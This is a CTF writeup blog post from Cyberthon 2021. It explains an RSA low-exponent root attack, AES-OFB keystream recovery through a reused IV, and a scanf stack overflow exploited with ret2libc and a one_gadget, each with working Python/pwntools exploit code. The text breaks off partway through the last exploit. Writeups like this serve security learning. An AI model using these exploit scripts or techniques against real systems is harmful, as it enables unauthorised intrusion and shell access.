I"™æ<p>Finally, another local CTF. More writeups, more clout. :P</p>

<p>Barring Whitehacks, this CTF was probably the most stressful of them all. As a person who takes time to think, 7 hours heavily cripples my ability to do challenges.</p>

<p>Moreover, all the various schools fielded many fearsome competitors that really kept us on our toes D: (acsi üëÄ), especially when the scoreboard was frozen an hour before the end of the competition!</p>

<p>Nonetheless we managed to pull through to clinch overall champions!</p>

<p><img src="/assets/Images/Cyberthon-2021/results.png" alt="" /></p>

<h1 id="writeups">Writeups</h1>
<p>Due to time constraints I will share my cleanest writeups so no one will have to suffer from my unassailable reputation for digital illegibility:</p>
<ol>
  <li><a href="#welp">(Crypto) Welp 1.0/2.0</a></li>
  <li><a href="#encraptor-1.0">(Crypto) Encraptor 1.0</a></li>
  <li><a href="#apcafe">(Pwn) apcafe</a></li>
  <li><a href="#apcdb">(Pwn) apcdb</a></li>
  <li><a href="#placeholder">(Pwn) Placeholder</a></li>
</ol>

<h2 id="welp">Welp</h2>
<p><code class="language-plaintext highlighter-rouge">APOCALYPSE heard us dissing on their RSA encryption script and decided to update it. But the moment we saw their updated implementation, we all collectively went welp once again. Let's see if you can manage to decrypt a flag that has been encrypted with their updated script.</code></p>

<p>(Here I only go through Welp2.0, as Welp1.0 is the exact same thing.)</p>

<h3 id="reconnaissance">Reconnaissance</h3>
<p>As can be gleaned from the description, the challenge is about RSA.</p>

<p>We are greeted with:</p>
<ul>
  <li>An encrypted flag file</li>
  <li>A public key giving us APOCALYPSE‚Äôs public key:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">N</span><span class="o">=</span><span class="mh">0x00a55869b46dfbe65a018f243c59bd8c1ea75bec4eb4ff1a0e3423a63c416583e5d43a16b9ec3f79f5a227e5579cf216d38515c36967935fd487a71438e167bef5f75a9eb0efa4c0451f0b052feb0614b4b51cf00c3320032017ba3b0e1ceff69aeb90131f8b3d80df14caf63f2a6d3ef40893360b0f12cd4e15a168b37d5f85e1</span>
<span class="n">e</span><span class="o">=</span><span class="mi">5</span>
</code></pre></div></div>
<ul>
  <li>APOCALYPSE‚Äôs source, which outwardly appears to have no problems‚Ä¶</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Personal comment: PyCryptodome just doesn't feel right in a CTF setting...
</span><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span>
<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">long_to_bytes</span>

<span class="n">rsa</span> <span class="o">=</span> <span class="n">RSA</span><span class="p">.</span><span class="n">construct</span><span class="p">((</span><span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span> <span class="o">*</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">),</span> <span class="mi">5</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.txt'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>

<span class="n">plaintext</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">rsa</span><span class="p">.</span><span class="n">e</span><span class="p">,</span> <span class="n">rsa</span><span class="p">.</span><span class="n">n</span><span class="p">)</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./dist/flag.txt.encrypted'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./dist/pubkey.pem'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">rsa</span><span class="p">.</span><span class="n">export_key</span><span class="p">(</span><span class="s">'PEM'</span><span class="p">))</span>

</code></pre></div></div>

<p>‚Ä¶ or does it?</p>

<h3 id="well-no-but-actually-yes">Well, no, but actually yes</h3>

<p>Since the challenge gives you nothing else the only way one can get any progress is by noting some suspicious features of the RSA implementation:</p>
<ul>
  <li>Despite the use of PyCryptodome, there is <code class="language-plaintext highlighter-rouge">no padding</code>‚Ä¶</li>
  <li>The key is only 1024 bits long.</li>
  <li><code class="language-plaintext highlighter-rouge">e</code>=5</li>
</ul>

<p>So perhaps, since <code class="language-plaintext highlighter-rouge">e</code> is rather small and there is <code class="language-plaintext highlighter-rouge">no padding</code>, we can try a <code class="language-plaintext highlighter-rouge">Cube Root Attack</code>.</p>

<h3 id="math-sike-niktay">Math! (sike niktay)</h3>
<p>The <code class="language-plaintext highlighter-rouge">Cube Root Attack</code> is honestly one of the <strong>stupidest</strong> attacks one can do on RSA, and it really shows something about software engineers who fail to implement RSA properly‚Ä¶</p>

<p>Anyways, the attack hinges on the <code class="language-plaintext highlighter-rouge">basic</code> fact (provided you know modular arithmetic) that if</p>

\[\begin{equation} \label{eq:one}
c \equiv m^e \pmod N
\end{equation}\]

<p>then</p>

\[\begin{equation} \label{eq:two}
\exists k \in \mathbb{Z} \text{ s.t. } c = m^e + k \cdot N
\end{equation}\]

<p>where <code class="language-plaintext highlighter-rouge">c</code> denotes your ciphertext as an integer, <code class="language-plaintext highlighter-rouge">m</code> your plaintext message as an integer</p>

<p>Usually this is not an issue if you choose a larger public exponent <code class="language-plaintext highlighter-rouge">e</code>, because <code class="language-plaintext highlighter-rouge">k</code> would be beyond the reach of your average consumer computer.</p>

<p>But <code class="language-plaintext highlighter-rouge">e</code>=5 in this context, so there‚Äôs a good chance we can easily recover it.</p>

<p>In order to recover the original message, we simply rearrange the equation \(\eqref{eq:two}\) to get:</p>

\[\begin{equation} \label{eq:three}
\sqrt[e]{c - k \cdot N} = m
\end{equation}\]

<p>Or rather, since we know from \(\eqref{eq:one}\) that the <code class="language-plaintext highlighter-rouge">c</code> given to us is smaller than <code class="language-plaintext highlighter-rouge">N</code>,</p>

\[\begin{equation} \label{eq:four}
\sqrt[e]{c + k \cdot N} = m
\end{equation}\]

<p>(<code class="language-plaintext highlighter-rouge">k</code> is just some integer and this isn‚Äôt math lesson so abuses of notation are a-ok)</p>

<h3 id="the-exploit">The Exploit</h3>
<p>Last thing left to do is to find <code class="language-plaintext highlighter-rouge">k</code>.</p>

<p>Just bruteforce :))).</p>

<p>(Unfortunately you will have to endure <code class="language-plaintext highlighter-rouge">Decimal</code> code since I was too lazy to get <code class="language-plaintext highlighter-rouge">Sagemath</code> to work and I did the exact same challenge last year‚Ä¶)</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span><span class="n">bytes_to_long</span>
<span class="kn">from</span> <span class="nn">decimal</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">N</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="mh">0x00a55869b46dfbe65a018f243c59bd8c1ea75bec4eb4ff1a0e3423a63c416583e5d43a16b9ec3f79f5a227e5579cf216d38515c36967935fd487a71438e167bef5f75a9eb0efa4c0451f0b052feb0614b4b51cf00c3320032017ba3b0e1ceff69aeb90131f8b3d80df14caf63f2a6d3ef40893360b0f12cd4e15a168b37d5f85e1</span><span class="p">)</span>
<span class="n">e</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="n">Decimal</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">getcontext</span><span class="p">().</span><span class="n">prec</span> <span class="o">=</span> <span class="mi">1000</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt.encrypted"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">c</span><span class="o">=</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>

<span class="n">getcontext</span><span class="p">().</span><span class="n">prec</span> <span class="o">=</span> <span class="mi">1000</span>
<span class="n">N</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
<span class="n">E</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
<span class="n">C</span><span class="o">=</span><span class="n">Decimal</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">):</span>
    <span class="n">R</span><span class="o">=</span><span class="n">Decimal</span><span class="p">((</span><span class="n">k</span><span class="o">*</span><span class="n">N</span><span class="o">+</span><span class="n">C</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="n">E</span><span class="p">))</span>
    <span class="k">if</span><span class="p">(</span><span class="n">R</span><span class="o">!=</span><span class="n">R</span><span class="p">.</span><span class="n">to_integral_value</span><span class="p">()):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"R for {}: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">R</span><span class="p">))</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Integer Form of R: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="n">to_integral_value</span><span class="p">()))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Yay! {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">R</span><span class="p">.</span><span class="n">to_integral_value</span><span class="p">())))</span>
        <span class="k">break</span>
</code></pre></div></div>

<p>And we get:
<img src="/assets/Images/Cyberthon-2021/welp.png" alt="" /></p>

<h3 id="flag">Flag!</h3>
<p><code class="language-plaintext highlighter-rouge">Cyberthon{f0rg0t_t0_p4d!}</code></p>

<p>p.s. welp1.0 is the exact same thing but \(k=0\).</p>

<h2 id="encraptor-10">Encraptor 1.0</h2>
<p><code class="language-plaintext highlighter-rouge">To ensure that all APOCALYPSE agents are encrypting their files properly, APOCALYPSE has decided to provide a centralized encryption service for all their members. We've recently recovered a flag that was encrypted by their service. Can you try to recover the flag?</code></p>

<h3 id="reconnaissance-1">Reconnaissance</h3>
<p>We are greeted with:</p>
<ul>
  <li>An encrypted flag</li>
  <li>Whatever APOCALYPSE is running on their server:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#! /usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">MD5</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
<span class="kn">import</span> <span class="nn">sys</span>


<span class="n">KEY</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/home/encraptor1/aeskey'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="n">IV</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'/home/encraptor1/iv'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">prompt</span><span class="p">):</span>
    <span class="n">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">write</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">data</span>


<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">TypeError</span><span class="p">:</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">prompt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>

    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">flush</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">md5sum</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">md5</span> <span class="o">=</span> <span class="n">MD5</span><span class="p">.</span><span class="n">new</span><span class="p">()</span>
    <span class="n">md5</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">md5</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_OFB</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">iv</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">md5sum</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">banner</span><span class="p">():</span>
    <span class="n">write</span><span class="p">(</span><span class="s">"  ______        _____                 _               __   ___  </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="s">" |  ____|      / ____|               | |             /_ | / _ </span><span class="se">\\</span><span class="s"> </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="s">" | |__   _ __ | |     _ __ __ _ _ __ | |_ ___  _ __   | || | | |</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="s">" |  __| | '_ </span><span class="se">\\</span><span class="s">| |    | '__/ _` | '_ </span><span class="se">\\</span><span class="s">| __/ _ </span><span class="se">\\</span><span class="s">| '__|  | || | | |</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="s">" | |____| | | | |____| | | (_| | |_) | || (_) | |     | || |_| |</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="s">" |______|_| |_|</span><span class="se">\\</span><span class="s">_____|_|  </span><span class="se">\\</span><span class="s">__,_| .__/ </span><span class="se">\\</span><span class="s">__</span><span class="se">\\</span><span class="s">___/|_|     |_(_)___/ </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="s">"                               | |                              </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="s">"                               |_|                              </span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">write</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="c1"># To be fair 
</span><span class="n">banner</span><span class="p">()</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="s">'[+] Data: '</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="s">'[+] Encrypted:</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="s">'----------------------------- START -------------------------------</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">IV</span><span class="p">))</span>
<span class="n">write</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">------------------------------ END --------------------------------'</span><span class="p">)</span>
</code></pre></div></div>

<p>Ostensibly this uses the AES block cipher with <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Output_feedback_(OFB)">Output-Feedback</a> mode (OFB).</p>

<p>A diagram of how the encryption happens at a high level is attached by shamelessly ripping off Wikipedia:
<img src="/assets/Images/Cyberthon-2021/AES-OFB.png" alt="" /></p>

<p>This is a lot more straightforward compared to Welp2.0:</p>

<p>We simply need to notice that the <code class="language-plaintext highlighter-rouge">IV</code> (initialization vector) which <strong>SHOULD</strong> be randomized is instead set to some <code class="language-plaintext highlighter-rouge">constant value</code>. <strong>THAT‚ÄôS BAD</strong>.</p>

<h3 id="wait-why">Wait why</h3>

<p>Notice on the diagram that the <code class="language-plaintext highlighter-rouge">encryption</code> and <code class="language-plaintext highlighter-rouge">decryption</code> protocols are largely similar, except that the positions of the <code class="language-plaintext highlighter-rouge">ciphertext</code> and <code class="language-plaintext highlighter-rouge">plaintext</code> are swapped.</p>

<p>Theoretically you <code class="language-plaintext highlighter-rouge">COULD</code> just feed the <code class="language-plaintext highlighter-rouge">ciphertext</code> into the service, but for whatever reason that didn‚Äôt go so well for me.</p>

<p>Instead, I believe my solution is more intuitive:</p>
<ol>
  <li>Send a <code class="language-plaintext highlighter-rouge">dummy string</code> of really long length.</li>
  <li><code class="language-plaintext highlighter-rouge">XOR</code> the ciphertext given to you by the service with your <code class="language-plaintext highlighter-rouge">dummy string</code> to retrieve your <code class="language-plaintext highlighter-rouge">XOR</code> <strong>key</strong>.</li>
  <li><code class="language-plaintext highlighter-rouge">XOR</code> the key with your flag ciphertext to retrieve flag!</li>
</ol>

<h3 id="the-flag">The flag</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># IV reuse in OFB mode
# No better than XOR cipher.
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg"</span><span class="p">,</span><span class="mi">20101</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">64</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">shutdown</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"----------------------------- START -------------------------------</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">enc</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"------------------------------ END --------------------------------"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">68</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
<span class="n">key</span><span class="o">=</span><span class="n">xor</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">64</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"KEY FOUND: </span><span class="si">{</span><span class="n">key</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="c1"># Now that we recovered the iv, we simply go and decrypt anything we like...
</span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt.encrypted"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">flag</span><span class="o">=</span><span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">msg</span><span class="o">=</span><span class="n">xor</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span><span class="n">key</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"MSG: </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>Flag: <code class="language-plaintext highlighter-rouge">Cyberthon{mfw_3ncrypt10n_s4m3_45_d3crypt_s4dg3}</code></p>

<h2 id="apcafe">apcafe</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We've received intel that APOCALYPSE is running a cafe as a front for their illegal activities. Although it seems like a regular cafe on the 
outside, serving local favourites such as Kopi-O, Milo, and Yuan Yang, we believe that something more sinister is going on. Could u try to 
find a way to break in so we can investigate further?
</code></pre></div></div>

<h3 id="reconnaissance-2">Reconnaissance</h3>

<p>We are greeted by a 64-bit binary that has the following functions:
<img src="/assets/Images/Cyberthon-2021/apcafe-main.png" alt="" />
<img src="/assets/Images/Cyberthon-2021/apcafe-serveorder.png" alt="" /></p>

<p>Of course, not forgetting our checksec‚Ä¶
<img src="/assets/Images/Cyberthon-2021/apcafe-checksec.png" alt="" /></p>

<p>Let‚Äôs cut to the chase, I‚Äôm strapped for time.</p>

<h3 id="vulnerability-analysis">Vulnerability Analysis</h3>
<p>One only needs to notice this vulnerability for everything to make sense:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">serve_order()</code> stops you from placing more than 10 characters into the buffer‚Ä¶</li>
  <li>But <code class="language-plaintext highlighter-rouge">scanf()</code> terminates after null byte (<code class="language-plaintext highlighter-rouge">\0</code>), does not stop us from writing more junk to the stack.</li>
</ul>

<p>Also:</p>
<ul>
  <li>We have no <code class="language-plaintext highlighter-rouge">win()</code> function, so we should be looking at some way to get us <strong>shell</strong>.</li>
</ul>

<p>However <code class="language-plaintext highlighter-rouge">NX-bit</code> is turned on, so our first instinct is to look at what <strong>ROP gadgets</strong> we have‚Ä¶
<img src="/assets/Images/Cyberthon-2021/apcafe-ropper.png" alt="" /></p>

<p>Rats. No <code class="language-plaintext highlighter-rouge">syscall</code> gadget.</p>

<p>With the information so far, we are most likely looking at a <strong>ret2libc</strong>, where we exploit a <strong>onegadget</strong> to instantly obtain <strong>shell</strong>.</p>

<p>This should be fairly easy as such a technique was covered in the <code class="language-plaintext highlighter-rouge">training challenges</code>‚Ä¶</p>

<h3 id="the-exploit-1">The Exploit</h3>

<p>Instead of painstakingly explaining everything I will simply annotate my code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg"</span><span class="p">,</span><span class="mi">30101</span><span class="p">)</span>
<span class="c1"># r=process("./apcafe",env={"LD_PRELOAD" : "./libc6_2.31-0ubuntu9.2_amd64.so"}) 
# The above is the correct LIBC version you should obtain from https://libc.blukat.me
</span><span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./apcafe"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"order?"</span><span class="p">)</span>
<span class="c1"># scanf reads without restriction.
# To circumvent the pesky check in serve_order() just send a null-byte after 10 characters.
# This is probably a ropchain into shell since there is no win function
# no syscall... means leak LIBC address from remote.
</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4015a3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main"</span><span class="p">]))</span>
<span class="c1"># The stack pointer is at offset 18. Verify it yourself on GDB!
</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"..."</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">puts_libc</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="o">-</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> 
<span class="c1"># Leak the address of the puts() function in the GOT table.
# The GOT table address is used since it is a link to the LIBC address.
</span><span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"PUTS: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts_libc</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"order?"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4015a3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"exit"</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main"</span><span class="p">]))</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"..."</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">exit_libc</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[</span><span class="o">-</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"EXIT: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">exit_libc</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="c1"># Same thing as above.
</span>
<span class="c1"># It turns out there are 3 possible libc versions...
# TRY THEM ALL!!!!
# 9.0 is already there, failed.
# 9.2: db/local-a1ca4cd2d1df2fcd2c0f582665051c261d84c1d6.symbols
</span><span class="n">libc_base</span><span class="o">=</span><span class="n">puts_libc</span><span class="o">-</span><span class="mh">0x875a0</span> 
<span class="c1"># Offset of puts() function in GOT table.
# Obtained from libc-database, you should check it out.
</span><span class="n">one_gadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0xe6c84</span>
<span class="c1"># Obtained from one-gadget. Check that out too.
